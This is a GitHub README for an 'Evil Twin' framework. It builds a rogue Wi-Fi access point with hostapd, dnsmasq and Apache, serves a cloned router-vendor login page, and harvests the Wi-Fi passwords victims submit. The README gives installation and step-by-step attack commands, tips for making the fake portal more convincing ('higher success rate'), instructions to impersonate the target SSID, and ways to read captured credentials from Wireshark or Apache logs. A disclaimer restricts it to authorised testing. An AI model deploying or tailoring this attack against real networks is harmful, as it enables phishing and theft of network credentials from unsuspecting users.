# Evil-Twin Captive Portal Framework

**Host any customized captive portal (vendor-specific login pages) for Evil Twin attacks using Apache2, hostapd & dnsmasq**

[![License: Educational](https://img.shields.io/badge/License-Educational%20Use%20Only-red.svg)](https://github.com/Bilal-Ahmed-Khalil/Evil-Twin)
[![Platform](https://img.shields.io/badge/Platform-Kali%20Linux%20%7C%20Ubuntu-blue.svg)](https://www.kali.org/)
[![Language](https://img.shields.io/badge/Language-Python%20%7C%20Bash-yellow.svg)]()

> Designed especially for regions where router vendor login pages are highly diverse (e.g., Pakistan — TP-Link, Huawei, Tenda, D-Link, local ISP gateways).

---

### ⚠️ Legal & Ethical Disclaimer

This tool is created **strictly for educational purposes, authorized penetration testing, red team exercises, and security research**.

- Using this tool against any network without **explicit written permission** is **illegal**.
- The author is **not responsible** for any misuse or damage caused by this tool.
- Always obtain proper authorization before testing any wireless network.

**By using this repository, you agree to use it responsibly and ethically.**

---

### Features

- Fully customizable captive portal (any HTML/CSS/JS page)
- Supports vendor-specific login pages (perfect for local routers in Pakistan and similar markets)
- Simple one-command automation via Python script
- Uses standard & reliable stack: `hostapd` + `dnsmasq` + `Apache2`
- Easy credential capture via Wireshark / Apache logs
- Lightweight and works on most Kali Linux / Ubuntu systems with compatible wireless adapters

---

### Requirements

| Component              | Requirement                                      |
|------------------------|--------------------------------------------------|
| Operating System       | Kali Linux (recommended) or Ubuntu               |
| Wireless Adapter       | Must support **Monitor Mode + AP Mode** (nl80211)|
| Packages               | hostapd, dnsmasq, apache2, iptables, python3     |
| Privileges             | Root / sudo                                      |

---

### Installation

```bash
# Clone the repository
git clone [https://github.com/Bilal-Ahmed-Khalil/Evil-Twin.git](https://github.com/Bilal-Ahmed-Khalil/Evil-Twin.git)
cd Evil-Twin

# Install required packages (Kali/Ubuntu)
sudo apt update
sudo apt install hostapd dnsmasq apache2 -y

Quick StartPlace your captive portal pageBashsudo cp your-custom-portal.html /var/www/html/index.html
Tip: Clone real vendor pages (TP-Link, Huawei, etc.) for higher success rate.Stop NetworkManagerBashsudo systemctl stop NetworkManager
Run the toolBashsudo python3 wifitool.py -i wlan0
Replace wlan0 with your wireless interface name.Capture credentialsOpen Wireshark and filter: http.request.method == POSTOr check Apache access logsManual Step-by-Step Setup (Alternative)Bash# 1. Place portal
sudo cp index.html /var/www/html/

# 2. Stop NetworkManager
sudo systemctl stop NetworkManager

# 3. Flush iptables
sudo ./8.1\ flushiptables.sh.sh

# 4. Start dnsmasq & hostapd
sudo dnsmasq -C "9.1 dnsmasq.conf.conf"
sudo hostapd "9.2 hostapd.conf.conf" -B

# 5. Assign IP
sudo ifconfig wlan0 10.0.0.1 netmask 255.255.255.0

# 6. Enable Apache rewrite & start
sudo a2enmod rewrite
sudo systemctl restart apache2
sudo systemctl start apache2
Configuration FilesFilePurpose9.2 hostapd.conf.confRogue AP settings (SSID, channel)9.1 dnsmasq.conf.confDHCP + DNS redirection8.1 flushiptables.sh.shClears and sets redirection rulesindex.htmlYour captive portal pagewifitool.pyAutomation scriptImportant: Edit ssid= inside 9.2 hostapd.conf.conf to match the target network name.Captive Portal Tips (Higher Success Rate)Use real vendor login page design (TP-Link, Huawei HG series, Tenda, etc.)Keep the page simple and mobile-friendlyUse POST method for the password fieldAdd a loading animation after submit (increases realism)Example form field:HTML<input type="password" name="password" placeholder="WiFi Password" required>
Capturing CredentialsMethod 1 – Wireshark (Recommended)Bashsudo wireshark
# Filter: http.request.method == "POST"
Method 2 – Apache LogsBashsudo tail -f /var/log/apache2/access.log
Project StructureEvil-Twin/
├── wifitool.py                 # Main automation script
├── index.html                  # Default captive portal
├── 9.1 dnsmasq.conf.conf       # DHCP + DNS config
├── 9.2 hostapd.conf.conf       # Rogue AP config
├── 8.1 flushiptables.sh.sh     # iptables rules
├── 10.1 rewrite-rules.txt.txt  # Apache rewrite rules
└── README.md
TroubleshootingProblemSolutionInterface not foundCheck with iwconfig or ip linkhostapd failsMake sure adapter supports AP modeClients not getting IPRestart dnsmasq and check DHCP rangePortal not loadingVerify Apache is running + rewrite enabledNetworkManager conflictAlways stop it before starting the attackAuthorBilal Ahmed KhalilGitHub: Bilal-Ahmed-KhalilLicenseThis project is released for educational and authorized security testing purposes only.Unauthorized use is strictly prohibited.
